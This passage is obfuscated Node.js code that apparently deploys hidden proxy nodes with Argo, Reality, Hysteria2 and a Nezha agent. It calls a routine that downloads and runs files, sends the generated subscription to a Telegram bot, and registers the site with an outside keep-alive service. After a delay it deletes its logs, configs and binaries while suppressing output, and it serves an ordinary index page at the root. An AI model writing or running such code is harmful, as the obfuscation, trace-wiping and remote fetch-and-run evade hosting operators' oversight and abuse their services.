      _0xa8e257 = [bootLogPath, configPath, webPath, botPath, listPath, certPath, keyPath]
    if (NEZHA_PORT) _0xa8e257[_0x163d14(_0x3dc3ee._0x1160bb)](npmPath)
    else NEZHA_SERVER && NEZHA_KEY && _0xa8e257[_0x163d14(_0x3dc3ee._0x33f071)](phpPath)
    process[_0x163d14(_0x3dc3ee._0x59b225)] === _0x163d14(0x1ad)
      ? exec(_0x163d14(0x1ee) + _0xa8e257[_0x163d14(0x237)]('\x20') + '\x20>\x20nul\x202>&1', (_0x2a8f92) => {
          const _0x1de233 = _0x163d14
          ;(console[_0x1de233(0x19d)](),
            alwaysLog(_0x1de233(_0x1ed4dd._0x57a3fd)),
            console[_0x1de233(_0x1ed4dd._0x4927d9)](_0x1de233(_0x1ed4dd._0x31d0b1)))
        })
      : exec(_0x163d14(0x1c0) + _0xa8e257[_0x163d14(0x237)]('\x20') + _0x163d14(_0x3dc3ee._0x487bac), (_0x13bcd8) => {
          const _0x5c8fb4 = _0x163d14
          ;(console[_0x5c8fb4(_0x544084._0x312178)](),
            alwaysLog(_0x5c8fb4(_0x544084._0x96a6c7)),
            console[_0x5c8fb4(_0x544084._0x41456a)](_0x5c8fb4(0x18c)))
        })
  }, 0x15f90)
}
cleanFiles()
async function sendTelegram() {
  const _0x2b1182 = { _0x57b1e9: 0x1f6, _0x1fa97d: 0x1a4, _0x39c9fd: 0x1c6, _0x4cf12b: 0x163, _0x53cea2: 0x1de },
    _0x33f848 = _0x26a414
  if (!BOT_TOKEN || !CHAT_ID) {
    console['log'](_0x33f848(0x168))
    return
  }
  try {
    const _0xaa4912 = fs[_0x33f848(0x15f)](subPath, _0x33f848(_0x2b1182._0x57b1e9)),
      _0x3af53d = _0x33f848(_0x2b1182._0x1fa97d) + BOT_TOKEN + _0x33f848(_0x2b1182._0x39c9fd),
      _0x39d8b2 = NAME[_0x33f848(0x214)](/[_*\[\]()~`>#+=|{}.!-]/g, '\x5c$&'),
      _0x14cf9d = { chat_id: CHAT_ID, text: '**' + _0x39d8b2 + _0x33f848(_0x2b1182._0x4cf12b) + _0xaa4912 + '```', parse_mode: 'MarkdownV2' }
    ;(await axios[_0x33f848(0x14c)](_0x3af53d, null, { params: _0x14cf9d }), console['log']('Telegram\x20message\x20sent\x20successfully'))
  } catch (_0x7ad24d) {
    console[_0x33f848(0x1bc)]('Failed\x20to\x20send\x20Telegram\x20message:', _0x7ad24d[_0x33f848(_0x2b1182._0x53cea2)])
  }
}
async function AddVisitTask() {
  const _0x1bf919 = { _0xe79e9b: 0x14c, _0x354147: 0x185, _0x285b7b: 0x1de },
    _0x37dba5 = _0x26a414
  if (!AUTO_ACCESS || !PROJECT_URL) {
    console['log'](_0x37dba5(0x164))
    return
  }
  try {
    const _0x1fad3c = await axios[_0x37dba5(_0x1bf919._0xe79e9b)](
      _0x37dba5(0x148),
      { url: PROJECT_URL },
      { headers: { 'Content-Type': _0x37dba5(_0x1bf919._0x354147) } }
    )
    return (console['log']('automatic\x20access\x20task\x20added\x20successfully'), _0x1fad3c)
  } catch (_0x4e54cb) {
    return (console[_0x37dba5(0x1bc)](_0x37dba5(0x165) + _0x4e54cb[_0x37dba5(_0x1bf919._0x285b7b)]), null)
  }
}
async function startserver() {
  const _0x486fb7 = { _0x4f354c: 0x1bc, _0x235da0: 0x221 },
    _0x505b94 = _0x26a414
  try {
    ;(argoType(),
      deleteNodes(),
      cleanupOldFiles(),
      isValidPort(REALITY_PORT) && generateOrLoadKeyPair(),
      isValidPort(HY2_PORT) && ensureTlsCertificates(certPath, keyPath),
      await generateConfig(),
      await downloadFilesAndRun(),
      await extractDomains(),
      await sendTelegram(),
      await AddVisitTask())
  } catch (_0x35f64d) {
    console[_0x505b94(_0x486fb7._0x4f354c)](_0x505b94(_0x486fb7._0x235da0), _0x35f64d)
  }
}
startserver()[_0x26a414(0x230)]((_0x10cec7) => {
  const _0x1a0851 = { _0x34ee60: 0x19f },
    _0xe9c613 = _0x26a414
  console[_0xe9c613(0x1bc)](_0xe9c613(_0x1a0851._0x34ee60), _0x10cec7)
})
const server = http[_0x26a414(0x22e)](async (_0x15a9be, _0x17aa94) => {
  const _0x60baef = {
      _0x4791c5: 0x1a9,
      _0x3ce8d3: 0x1b8,
      _0x334337: 0x14a,
      _0x414b85: 0x1b8,
      _0x23b4cb: 0x180,
      _0x549a42: 0x237,
      _0x2d36a6: 0x19c,
      _0x5d218b: 0x1a9,
      _0x2299f4: 0x161,
      _0x432f49: 0x12b
    },
    _0x4b2d35 = _0x26a414,
    _0x25e7fb = _0x15a9be[_0x4b2d35(0x234)][_0x4b2d35(0x1b9)]('?')[0x0]
  if (_0x25e7fb === '/' + SUB_PATH) {
    if (subContent)
      (_0x17aa94[_0x4b2d35(_0x60baef._0x4791c5)](0xc8, { 'Content-Type': _0x4b2d35(0x1ab) }), _0x17aa94[_0x4b2d35(_0x60baef._0x3ce8d3)](subContent))
    else
      try {
        const _0x2a5ccb = fs['readFileSync'](subPath, _0x4b2d35(_0x60baef._0x334337))
        ;(_0x17aa94[_0x4b2d35(_0x60baef._0x4791c5)](0xc8, { 'Content-Type': _0x4b2d35(0x1ab) }), _0x17aa94[_0x4b2d35(0x1b8)](_0x2a5ccb))
      } catch (_0x5c4dd9) {
        ;(_0x17aa94['writeHead'](0x1f7, { 'Content-Type': 'text/plain;\x20charset=utf-8' }),
          _0x17aa94[_0x4b2d35(_0x60baef._0x414b85)](_0x4b2d35(_0x60baef._0x23b4cb)))
      }
    return
  }
  if (_0x25e7fb === '/') {
    try {
      const _0x672bf5 = path[_0x4b2d35(_0x60baef._0x549a42)](__dirname, _0x4b2d35(0x1c3)),
        _0x1abc73 = await fs[_0x4b2d35(0x14f)][_0x4b2d35(_0x60baef._0x2d36a6)](_0x672bf5, _0x4b2d35(0x1f6))
      ;(_0x17aa94[_0x4b2d35(_0x60baef._0x5d218b)](0xc8, { 'Content-Type': 'text/html;\x20charset=utf-8' }), _0x17aa94['end'](_0x1abc73))
    } catch (_0x5d92f4) {
      ;(_0x17aa94[_0x4b2d35(_0x60baef._0x4791c5)](0xc8, { 'Content-Type': _0x4b2d35(_0x60baef._0x2299f4) }), _0x17aa94['end'](_0x4b2d35(0x151)))
    }
    return
  }
  ;(_0x17aa94[_0x4b2d35(0x1a9)](0x194, { 'Content-Type': _0x4b2d35(0x1ab) }), _0x17aa94['end'](_0x4b2d35(_0x60baef._0x432f49)))
})
server[_0x26a414(0x145)](PORT, () => alwaysLog('http\x20server\x20is\x20running\x20on\x20' + PORT + '!'))
